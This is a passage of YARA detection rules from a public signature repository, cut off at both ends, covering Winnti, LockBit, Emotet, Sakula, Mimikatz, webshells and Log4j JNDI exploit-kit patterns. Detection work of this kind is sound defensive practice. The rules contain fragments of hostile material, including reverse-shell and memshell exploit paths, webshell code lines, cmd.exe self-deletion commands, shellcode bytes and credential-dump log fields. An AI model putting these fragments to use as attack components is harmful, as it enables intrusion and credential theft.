		$b3 = { 8B 4B E4 8B 53 EC 41 B8 00 40 00 00 4? 0B C? FF 9? B8 00 00 00 EB }

	condition:
		(2 of ( $b* ) )
}

rule SIGNATURE_BASE_APT_Winnti_MAL_Dec19_5
{
	meta:
		description = "Detects Winnti malware"
		author = "Unknown"
		id = "2a8f28e6-5a01-5a2f-b89b-9c34163afcda"
		date = "2019-12-06"
		modified = "2023-12-05"
		reference = "https://www.verfassungsschutz.de/download/broschuere-2019-12-bfv-cyber-brief-2019-01.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_winnti.yar#L237-L264"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "977d11fbb7cf4678d4da179c43d5566520ee97ac528e269a9b985e5bc75641b7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a1 = "-k netsvcs" ascii
		$a2 = "svchost.exe" ascii fullword
		$a3 = "%SystemRoot%\\System32\\ntoskrnl.exe" ascii
		$a4 = "Global\\BFE_Notify_Event_{65a097fe-6102-446a-9f9c-55dfc3f411015}" ascii
		$a5 = "Global\\BFE_Notify_Event_{65a097fe-6102-446a-9f9c-55dfc3f411014}" ascii
		$a6 = "Global\\BFE_Notify_Event_{65a097fe-6102-446a-9f9c-55dfc3f411016}" ascii
		$a7 = "cmd.exe" wide
		$a8 = ",XML" wide
		$a9 = "\\rundll32.exe" wide
		$a10 = "\\conhost.exe" wide
		$a11 = "\\cmd.exe" wide
		$a12 = "NtQueryInformationProcess" ascii
		$a13 = "Detours!" ascii fullword
		$a14 = "Loading modified build of detours library designed for MPC-HC player (http://sourceforge.net/projects/mpc-hc/)" ascii
		$a15 = "CONOUT$" wide fullword
		$a16 = { C6 0? E9 4? 8? 4? 05 [2] 89 4? 01 }

	condition:
		(12 of ( $a* ) )
}

rule SIGNATURE_BASE_APT_CN_Group_Loader_Jan20_1
{
	meta:
		description = "Detects loaders used by Chinese groups"
		author = "Vitali Kremez"
		id = "c85ae499-4f76-56ff-877d-887e1a7fc077"
		date = "2020-02-01"
		modified = "2023-12-05"
		reference = "https://twitter.com/VK_Intel/status/1223411369367785472?s=20"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_winnti.yar#L266-L278"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "30a180ada2390ca8df4bf7883624a5a176249622b4c34ce96931fe62b09ea8e3"
		score = 80
		quality = 85
		tags = ""

	strings:
		$xc1 = { 8B C3 C1 E3 10 C1 E8 10 03 D8 6B DB 77 83 C3 13 }

	condition:
		1 of them
}

rule SIGNATURE_BASE_HKTL_NFS_Fuse_NFS
{
	meta:
		description = "Detects the nfs-security-tooling fuse_nfs by HvS Consulting"
		author = "Moritz Oettle"
		id = "287fbe7d-ee1c-58a4-aa2d-9d9bec8321b4"
		date = "2024-10-22"
		modified = "2025-03-20"
		reference = "https://github.com/hvs-consulting/nfs-security-tooling"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/hktl_HvS_nfs_security_tooling.yar#L1-L24"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0bd3714b865d77660404e5f3ed1e9c7b55aadc6f58d16761111be57597784686"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "NFS3ConnectionFactory" fullword ascii
		$s2 = "fuse_to_nfs_timestamp" fullword ascii
		$s3 = "--manual-fh" fullword ascii
		$s4 = "--fake-uid-allow-root" fullword ascii
		$s5 = "nfs.rpc.credential" fullword ascii
		$s6 = "nfs.readlink" fullword ascii
		$s7 = "pyfuse3.EntryAttributes" fullword ascii
		$s8 = "Make nested exports on NetApp servers work" fullword ascii
		$s9 = "add_mutually_exclusive_group" fullword ascii

	condition:
		4 of them
}

rule SIGNATURE_BASE_HKTL_NFS_NFS_Analyze
{
	meta:
		description = "Detects the nfs-security-tooling nfy_analyze by HvS Consulting"
		author = "Marc Stroebel"
		id = "3350d0ae-e638-5c8f-a578-ba0ac5521053"
		date = "2024-10-22"
		modified = "2025-03-20"
		reference = "https://github.com/hvs-consulting/nfs-security-tooling"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/hktl_HvS_nfs_security_tooling.yar#L26-L53"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "83a9e5b5b404bf28b0334611fe4f38227212783cecea3c9996d23cb00cad42ed"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "no_root_squash_exports" fullword ascii
		$s2 = "nfs lock manager" fullword ascii
		$s3 = "netapp partner" fullword ascii
		$s4 = "xdrdef.mnt3_type" fullword ascii
		$s5 = "BTRFS subvolumes" fullword ascii
		$s6 = "Unsupported fsid" fullword ascii
		$s7 = "nfs3_read_etc_shadow" fullword ascii
		$s8 = "nfs3_check_no_root_squash" fullword ascii
		$s9 = "krb5i" fullword ascii
		$s10 = "nfs4_overview" fullword ascii
		$s11 = "--btrfs-subvolumes" fullword ascii
		$s12 = "when escaping a BTRFS export" fullword ascii
		$s13 = "No NFS server detected" fullword ascii

	condition:
		6 of them
}

rule SIGNATURE_BASE_Unauthorized_Proxy_Server_RAT
{
	meta:
		description = "Detects Proxy Server RAT"
		author = "US-CERT Code Analysis Team"
		id = "378573e3-17a7-5862-aae5-a8e84102e237"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.us-cert.gov/HIDDEN-COBRA-North-Korean-Malicious-Cyber-Activity"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_hiddencobra_bankshot.yar#L67-L92"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "7ede26272ddcb25dca2b44ff08b232f358078872f6cf76491b0fd8d65772c60d"
		score = 75
		quality = 85
		tags = ""
		hash1 = "C74E289AD927E81D2A1A56BC73E394AB"
		hash2 = "2950E3741D7AF69E0CA0C5013ABC4209"

	strings:
		$s0 = {8A043132C288043125FF00000003C299F73D40404900A14440490003D0413BCF72DE5E5FC3}
		$s1 = {8A04318844241432C28804318B44241425FF00000003C299F73D40404900A14440490003D0413BCF72D65E5FC3}
		$s2 = {8A04318844241432C28804318B44241425FF00000003C299F73D5C394100A16039410003D0413BCF72D65E5FC3}
		$s3 = {8A043132C288043125FF00000003C299F73D5C394100A16039410003D0413BCF72DE5E5FC3}
		$s4 = {B91A7900008A140780F29A8810404975F4}
		$s5 = {399FE192769F839DCE9F2A9D2C9EAD9CEB9FD19CA59F7E9F539CEF9F029F969C6C9E5C9D949FC99F}
		$s6 = {8A04318844241432C28804318B44241425FF00000003C299F73D40600910A14460091003D0413BCF72D65E5FC3}
		$s7 = {3C5C75208A41014184C074183C72740C3C7474083C6274043C2275088A41014184C075DC}
		$s8 = {8B063D9534120077353D59341200722E668B4604663DE8037F24}
		$s9 = {8BC88B74241CC1E1052BC88B7C2418C1E1048B5C241403C88D04888B4C242083F9018944240C7523}
		$s10 = {8B063D9034120077353D59341200722E668B4604663DE8037F246685C0}
		$s11 = {30110FB60148FFC102C20FBEC09941F7F94103D249FFC875E7}
		$s12 = {448BE8B84FECC44E41F7EDC1FA038BCAC1E91F03D16BD21A442BEA4183C541}
		$s13 = {8A0A80F9627C2380F9797F1E80F9647C0A80F96D7F0580C10BEB0D80F96F7C0A80F9787F05}

	condition:
		any of them
}

rule SIGNATURE_BASE_SUSP_Xored_Mozilla_Oct19
{
	meta:
		description = "Detects suspicious single byte XORed keyword 'Mozilla/5.0' - it uses yara's XOR modifier and therefore cannot print the XOR key. You can use the CyberChef recipe linked in the reference field to brute force the used key."
		author = "Florian Roth"
		id = "71e5b399-c384-5330-ae52-4e0a806e7969"
		date = "2019-10-28"
		modified = "2023-11-03"
		old_rule_name = "SUSP_XORed_Mozilla"
		reference = "https://gchq.github.io/CyberChef/#recipe=XOR_Brute_Force()"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_xor_hunting.yar#L2-L25"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e1b5c7a0adb4dc65cdf0a653255ac865a0ecebbf1ff08b7fc46d510d5e8aa6c9"
		score = 60
		quality = 85
		tags = ""

	strings:
		$xo1 = "Mozilla/5.0" xor ascii wide
		$xof1 = "Mozilla/5.0" ascii wide
		$fpa1 = "Sentinel Labs" wide
		$fpa2 = "<filter object at" ascii
		$fpb1 = { 64 65 78 0a 30 33 35 }

	condition:
		$xo1 and not $xof1 and not 1 of ( $fpa* ) and not $fpb1 at 0
}

rule SIGNATURE_BASE_MAL_Emotet_BKA_Quarantine_Apr21
{
	meta:
		description = "No description has been set in the source file - Signature Base"
		author = "press inquiries <info@bka.de>, technical contact <info@mha.bka.de>"
		id = "22c27d82-00cb-5d2f-a1cc-9f8b4c60aecd"
		date = "2021-03-23"
		modified = "2023-12-05"
		reference = "https://www.bka.de/DE/IhreSicherheit/RichtigesVerhalten/StraftatenImInternet/FAQ/FAQ_node.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/crime_emotet.yar#L39-L52"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "cc75be5f641e21446a41bf9cc855330a612847e7e3a3be935577d33195f40d05"
		score = 75
		quality = 85
		tags = ""
		descripton = "The modified emotet binary replaces the original emotet on the system of the victim. The original emotet is copied to a quarantine for evidence-preservation."
		note = "The quarantine folder depends on the scope of the initial emotet infection (user or administrator). It is the temporary folder as returned by GetTempPathW under a filename starting with UDP as returned by GetTempFileNameW. To prevent accidental reinfection by a user, the quarantined emotet is encrypted using RC4 and a 0x20 bytes long key found at the start of the quarantined file (see $key)."
		sharing = "TLP:WHITE"

	strings:
		$key = { c3 da da 19 63 45 2c 86 77 3b e9 fd 24 64 fb b8 07 fe 12 d0 2a 48 13 38 48 68 e8 ae 91 3c ed 82 }

	condition:
		$key at 0
}

rule SIGNATURE_BASE_Pos_Malware_Malumpos
{
	meta:
		description = "Used to detect MalumPOS memory dumper"
		author = "Trend Micro, Inc."
		id = "6d85c7fe-bf1b-53fb-b618-4b0f8b63cae4"
		date = "2015-05-25"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/crime_malumpos.yar#L1-L17"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "ece32e51a12adf0d68420c8d98efbe7df27b9061ddfe4dcedf151f9f06287eee"
		score = 75
		quality = 60
		tags = ""
		sample_filtype = "exe"

	strings:
		$string1 = "SOFTWARE\\Borland\\Delphi\\RTL"
		$string2 = "B)[0-9]{13,19}\\"
		$string3 = "[A-Za-z\\s]{0,30}\\/[A-Za-z\\s]{0,30}\\"
		$string4 = "TRegExpr(exec): ExecNext Without Exec[Pos]"
		$string5 = /Y:\\PROGRAMS\\.{20,300}\.pas/

	condition:
		all of ( $string* )
}

rule SIGNATURE_BASE_MAL_Shellcode_Loader_Apr23
{
	meta:
		description = "Detects Shellcode loader as seen being used by Gopuram backdoor"
		author = "X__Junior (Nextron Systems)"
		id = "363b67d6-9cac-513d-a545-1f256667bab8"
		date = "2023-04-03"
		modified = "2023-12-05"
		reference = "https://securelist.com/gopuram-backdoor-deployed-through-3cx-supply-chain-attack/109344/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_mal_gopuram_apr23.yar#L3-L18"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e4e423158757c80b5e4e77f6a343323a87798c6697cf6a832aa01a146712b250"
		score = 80
		quality = 85
		tags = ""
		hash1 = "6ce5b6b4cdd6290d396465a1624d489c7afd2259a4d69b73c6b0ba0e5ad4e4ad"
		hash2 = "b56279136d816a11cf4db9fc1b249da04b3fa3aef4ba709b20cdfbe572394812"

	strings:
		$op1 = { 41 C1 CB 0D 0F BE 03 48 FF C3 44 03 D8 80 7B ?? 00 75 ?? 41 8D 04 13 3B C6 74 }
		$op2 = { B9 49 F7 02 78 4C 8B E8 E8 ?? ?? ?? ?? B9 58 A4 53 E5 48 89 44 24 ?? E8 ?? ?? ?? ?? B9 10 E1 8A C3 48 8B F0 E8 ?? ?? ?? ?? B9 AF B1 5C 94 48 89 44 24 ?? E8 }

	condition:
		all of them
}

rule SIGNATURE_BASE_SUSP_Obfuscted_Powershell_Code
{
	meta:
		description = "Detects obfuscated PowerShell Code"
		author = "Florian Roth (Nextron Systems)"
		id = "e2d8fc9e-ce2b-5118-8305-0d5839561d4f"
		date = "2018-12-13"
		modified = "2025-02-12"
		reference = "https://twitter.com/silv0123/status/1073072691584880640"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_powershell_obfuscation.yar#L28-L41"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "afd7e4b88c812b23441549565a18fde18c24fe91ec467455002ef338e092ebf9"
		score = 65
		quality = 85
		tags = ""

	strings:
		$s1 = "').Invoke(" ascii
		$s2 = "(\"{1}{0}\"" ascii
		$s3 = "{0}\" -f" ascii

	condition:
		#s1> 11 and #s2 > 10 and #s3 > 10
}

rule SIGNATURE_BASE_Webshell_Caterpillar_ASPX
{
	meta:
		description = "Volatile Cedar Webshell - from file caterpillar.aspx"
		author = "Florian Roth (Nextron Systems)"
		id = "9af48c64-3768-5765-8245-38df000598a7"
		date = "2015-04-03"
		modified = "2023-12-05"
		reference = "http://goo.gl/emons5"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_volatile_cedar.yar#L106-L126"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "9df2e4a25052136d6e622273f917bd15df410869a8cf3075c773a14ea62a2a55"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "af4c99208fb92dc42bc98c4f96c3536ec8f3fe56"

	strings:
		$s0 = "Dim objNewRequest As WebRequest = HttpWebRequest.Create(sURL)" fullword
		$s1 = "command = \"ipconfig /all\"" fullword
		$s3 = "For Each xfile In mydir.GetFiles()" fullword
		$s6 = "Dim oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword
		$s10 = "recResult = adoConn.Execute(strQuery)" fullword
		$s12 = "b = Request.QueryString(\"src\")" fullword
		$s13 = "rw(\"<a href='\" + link + \"' target='\" + target + \"'>\" + title + \"</a>\")" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Malware_Sakula_Memory
{
	meta:
		description = "Sakula malware - strings after unpacking (memory rule)"
		author = "David Cannings"
		id = "328e3707-d11d-5b7f-bec4-18a42a2c658b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_sakula.yar#L20-L45"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b3852b9e7f2b8954be447121bb6b65c3"
		logic_hash = "ba6d93a1fc5fd81748eb462fc55b681987126ba853ddb677a5f1f9b74ba5cde8"
		score = 75
		quality = 85
		tags = ""

	strings:
		$str01 = "cmd.exe /c ping 127.0.0.1 & del \"%s\""
		$str02 = "cmd.exe /c rundll32 \"%s\" Play \"%s\""
		$str03 = "Mozilla/4.0+(compatible;+MSIE+8.0;+Windows+NT+5.1;+SV1)"
		$str04 = "cmd.exe /c cmd.exe /c cmd.exe /c cmd.exe /c cmd.exe /c cmd.exe /c \"%s\""
		$str05 = "Self Process Id:%d"
		$str06 = "%d_%d_%d_%s"
		$str07 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
		$str08 = "cmd.exe /c rundll32 \"%s\" ActiveQvaw \"%s\""
		$opcodes01 = { 83 F9 00 74 0E 31 C0 8A 03 D0 C0 34 ?? 88 03 49 43 EB ED }
		$opcodes02 = { 31 C0 8A 04 13 32 01 83 F8 00 75 0E 83 FA 00 74 04 49 4A }

	condition:
		4 of them
}

rule SIGNATURE_BASE_Malware_Sakula_Shellcode
{
	meta:
		description = "Sakula shellcode - taken from decoded setup.msi but may not be unique enough to identify Sakula"
		author = "David Cannings"
		id = "147e4894-7877-5367-9f6b-588eb7f0379a"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_sakula.yar#L47-L80"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0e84d91cd1bb0455ac7d2ca78583510388f39cebd95523c5f6f173a50e0c1951"
		score = 75
		quality = 85
		tags = ""

	strings:
		$opcodes01 = { 55 89 E5 E8 00 00 00 00 58 83 C0 06 C9 C3 }
		$opcodes02 = { 8B 5E 3C 8B 5C 1E 78 8B 4C 1E 20 53 8B 5C 1E 24 01 F3 }

	condition:
		any of them
}

rule SIGNATURE_BASE_MAL_RANSOM_Lockbit_Apr23_1
{
	meta:
		description = "Detects indicators found in LockBit ransomware"
		author = "Florian Roth"
		id = "75dc8b95-16f0-5170-a7d6-fc10bb778348"
		date = "2023-04-17"
		modified = "2023-12-05"
		reference = "https://objective-see.org/blog/blog_0x75.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/mal_lockbit_lnx_macos_apr23.yar#L43-L67"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "cd5bffa5571abfd1446b065d26c8c23f00fe1376d505af539c6f37356014a86f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$xe1 = "-i '/path/to/crypt'" xor
		$xe2 = "http://lockbit" xor
		$s1 = "idelayinmin" ascii
		$s2 = "bVMDKmode" ascii
		$s3 = "bSelfRemove" ascii
		$s4 = "iSpotMaximum" ascii
		$fp1 = "<html"

	condition:
		(1 of ( $x* ) or 4 of them ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_MAL_RANSOM_Lockbit_Locker_LOG_Apr23_1
{
	meta:
		description = "Detects indicators found in LockBit ransomware log files"
		author = "Florian Roth"
		id = "aa0a2393-e5a2-5151-8afb-91a9bb922179"
		date = "2023-04-17"
		modified = "2023-12-05"
		reference = "https://objective-see.org/blog/blog_0x75.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/mal_lockbit_lnx_macos_apr23.yar#L69-L84"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "d5f96e601150209382d3f6458863bc79768beb99b587aa8d9ba37cb2c11ef634"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = " is encrypted. Checksum after encryption "
		$s2 = "~~~~~Hardware~~~~"
		$s3 = "[+] Add directory to encrypt:"
		$s4 = "][+] Launch parameters: "

	condition:
		2 of them
}

rule SIGNATURE_BASE_MAL_RANSOM_Lockbit_Forensicartifacts_Apr23_1
{
	meta:
		description = "Detects forensic artifacts found in LockBit intrusions"
		author = "Florian Roth"
		id = "e716030c-ee78-51dc-919c-cf59e93da976"
		date = "2023-04-17"
		modified = "2023-12-05"
		reference = "https://objective-see.org/blog/blog_0x75.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/mal_lockbit_lnx_macos_apr23.yar#L86-L101"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "81021f8c9aed17c007d7329a598c644a706fa9750818c8974984eefcba8d06c2"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "/tmp/locker.log" ascii fullword
		$x2 = "Executable=LockBit/locker_" ascii
		$xc1 = { 54 6F 72 20 42 72 6F 77 73 65 72 20 4C 69 6E 6B 73 3A 0D 0A 68 74 74 70 3A 2F 2F 6C 6F 63 6B 62 69 74 }

	condition:
		1 of ( $x* )
}

rule SIGNATURE_BASE_EXPL_JNDI_Exploit_Patterns_Dec21_1
{
	meta:
		description = "Detects JNDI Exploit Kit patterns in files"
		author = "Florian Roth (Nextron Systems)"
		id = "a9127dd2-b818-5ca8-877a-3c47b1e92606"
		date = "2021-12-12"
		modified = "2025-03-29"
		reference = "https://github.com/pimps/JNDI-Exploit-Kit"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/expl_log4j_cve_2021_44228.yar#L16-L49"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "9442c8c4eee76539892752361657c86e80acc7990876e787317b042a4637f669"
		score = 60
		quality = 85
		tags = ""

	strings:
		$x01 = "/Basic/Command/Base64/"
		$x02 = "/Basic/ReverseShell/"
		$x03 = "/Basic/TomcatMemshell"
		$x04 = "/Basic/JettyMemshell"
		$x05 = "/Basic/WeblogicMemshell"
		$x06 = "/Basic/JBossMemshell"
		$x07 = "/Basic/WebsphereMemshell"
		$x08 = "/Basic/SpringMemshell"
		$x09 = "/Deserialization/URLDNS/"
		$x10 = "/Deserialization/CommonsCollections1/Dnslog/"
		$x11 = "/Deserialization/CommonsCollections2/Command/Base64/"
		$x12 = "/Deserialization/CommonsBeanutils1/ReverseShell/"
		$x13 = "/Deserialization/Jre8u20/TomcatMemshell"
		$x14 = "/TomcatBypass/Dnslog/"
		$x15 = "/TomcatBypass/Command/"
		$x16 = "/TomcatBypass/ReverseShell/"
		$x17 = "/TomcatBypass/TomcatMemshell"
		$x18 = "/TomcatBypass/SpringMemshell"
		$x19 = "/GroovyBypass/Command/"
		$x20 = "/WebsphereBypass/Upload/"
		$fp1 = "<html"

	condition:
		1 of ( $x* ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_SUSP_Jdniexploit_Error_Indicators_Dec21_1
{
	meta:
		description = "Detects error messages related to JDNI usage in log files that can indicate a Log4Shell / Log4j exploitation"
		author = "Florian Roth (Nextron Systems)"
		id = "68bcf043-58b4-54a9-b024-64871b5d535f"
		date = "2021-12-10"
		modified = "2023-06-23"
		reference = "https://twitter.com/marcioalm/status/1470361495405875200?s=20"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/expl_log4j_cve_2021_44228.yar#L213-L226"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "2ab98814b2ed66b0bda875fecc0b09db82035d7edcdb0af65f815817ec8c6cc8"
		score = 70
		quality = 85
		tags = ""

	strings:
		$x1 = "FATAL log4j - Message: BadAttributeValueException: "

	condition:
		1 of them
}

rule SIGNATURE_BASE_Invoke_Mimikatz
{
	meta:
		description = "Detects Invoke-Mimikatz String"
		author = "Florian Roth (Nextron Systems)"
		id = "37de51a6-e1bb-5ee7-9b7f-8fe17b3697b5"
		date = "2016-08-03"
		modified = "2023-12-05"
		reference = "https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_invoke_mimikatz.yar#L10-L24"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "b9bfa54a64d6f6b8af97ec62c9102ccf0912a19b65fbd25a4836480e63497a00"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "f1a499c23305684b9b1310760b19885a472374a286e2f371596ab66b77f6ab67"

	strings:
		$x2 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm" ascii
		$x3 = "Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_Wce
{
	meta:
		description = "wce"
		author = "Benjamin DELPY (gentilkiwi)"
		id = "857981ee-3f57-580b-8bfd-8d2109298e27"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_mimikatz.yar#L76-L89"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "a16db99dcaaf1b6c33a738aab4f4d3812366258bc2f6dd32250ee1b1a0616f1c"
		score = 75
		quality = 85
		tags = ""
		tool_author = "Hernan Ochoa (hernano)"

	strings:
		$hex_legacy = { 8b ff 55 8b ec 6a 00 ff 75 0c ff 75 08 e8 [0-3] 5d c2 08 00 }
		$hex_x86 = { 8d 45 f0 50 8d 45 f8 50 8d 45 e8 50 6a 00 8d 45 fc 50 [0-8] 50 72 69 6d 61 72 79 00 }
		$hex_x64 = { ff f3 48 83 ec 30 48 8b d9 48 8d 15 [0-16] 50 72 69 6d 61 72 79 00 }

	condition:
		any of them
}

rule SIGNATURE_BASE_Power_Pe_Injection
{
	meta:
		description = "PowerShell with PE Reflective Injection"
		author = "Benjamin DELPY (gentilkiwi)"
		id = "a71fe9f2-9c2a-5650-a5c7-116b76f10db6"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_mimikatz.yar#L91-L101"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "64a7033d51e8933912f37ce68bffc216073a88cae1ea7492e71a812411ae6a9d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$str_loadlib = "0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9"

	condition:
		$str_loadlib
}

rule SIGNATURE_BASE_Mimikatz_Logfile
{
	meta:
		description = "Detects a log file generated by malicious hack tool mimikatz"
		author = "Florian Roth (Nextron Systems)"
		id = "921d85fc-fb4d-57ed-b4ac-203d5c6f1e8e"
		date = "2015-03-31"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_mimikatz.yar#L103-L119"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "4591cda5bd5a555292087da26193accc4f00d7c0611be8d5ab6dd4dabb14a0ef"
		score = 80
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "SID               :" ascii fullword
		$s2 = "* NTLM     :" ascii fullword
		$s3 = "Authentication Id :" ascii fullword
		$s4 = "wdigest :" ascii fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_Mimikatz_Skeletonkey_In_Memory_Aug20_1
{
	meta:
		description = "Detects Mimikatz SkeletonKey in Memory"
		author = "Florian Roth (Nextron Systems)"
		id = "e7c1c512-e944-5d87-ac57-cdc9ab7cf660"
		date = "2020-08-09"
		modified = "2023-12-05"
		reference = "https://twitter.com/sbousseaden/status/1292143504131600384?s=12"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_mimikatz.yar#L178-L190"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0cc9a4d3b63e07a695df342bd2c96a55570502d6fd0ab9a1b61d63e28e1c3e05"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = { 60 ba 4f ca c7 44 24 34 dc 46 6c 7a c7 44 24 38 
